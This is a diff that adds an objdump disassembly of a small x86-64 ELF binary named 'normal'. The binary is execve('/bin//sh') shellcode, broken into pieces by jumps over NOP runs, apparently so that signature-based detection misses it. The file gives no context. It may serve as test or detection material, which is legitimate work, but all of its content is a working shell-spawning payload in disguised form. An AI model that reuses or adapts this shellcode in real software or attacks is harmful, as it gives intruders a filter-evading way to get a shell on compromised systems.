@@ -1,0 +1,50 @@
+
+normal:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000400080 <.text>:
+  400080:	48 31 d2             	xor    %rdx,%rdx
+  400083:	52                   	push   %rdx
+  400084:	68 2f 62 69 6e       	pushq  $0x6e69622f
+  400089:	eb 05                	jmp    0x400090
+  40008b:	90                   	nop
+  40008c:	90                   	nop
+  40008d:	90                   	nop
+  40008e:	90                   	nop
+  40008f:	90                   	nop
+  400090:	c7 44 24 04 2f 2f 73 	movl   $0x68732f2f,0x4(%rsp)
+  400097:	68 
+  400098:	eb 07                	jmp    0x4000a1
+  40009a:	90                   	nop
+  40009b:	90                   	nop
+  40009c:	90                   	nop
+  40009d:	90                   	nop
+  40009e:	90                   	nop
+  40009f:	90                   	nop
+  4000a0:	90                   	nop
+  4000a1:	58                   	pop    %rax
+  4000a2:	50                   	push   %rax
+  4000a3:	48 89 e7             	mov    %rsp,%rdi
+  4000a6:	52                   	push   %rdx
+  4000a7:	57                   	push   %rdi
+  4000a8:	eb 07                	jmp    0x4000b1
+  4000aa:	90                   	nop
+  4000ab:	90                   	nop
+  4000ac:	90                   	nop
+  4000ad:	90                   	nop
+  4000ae:	90                   	nop
+  4000af:	90                   	nop
+  4000b0:	90                   	nop
+  4000b1:	48 89 e6             	mov    %rsp,%rsi
+  4000b4:	48 31 c0             	xor    %rax,%rax
+  4000b7:	b0 3b                	mov    $0x3b,%al
+  4000b9:	eb 06                	jmp    0x4000c1
+  4000bb:	90                   	nop
+  4000bc:	90                   	nop
+  4000bd:	90                   	nop
+  4000be:	90                   	nop
+  4000bf:	90                   	nop
+  4000c0:	90                   	nop
+  4000c1:	0f 05                	syscall 
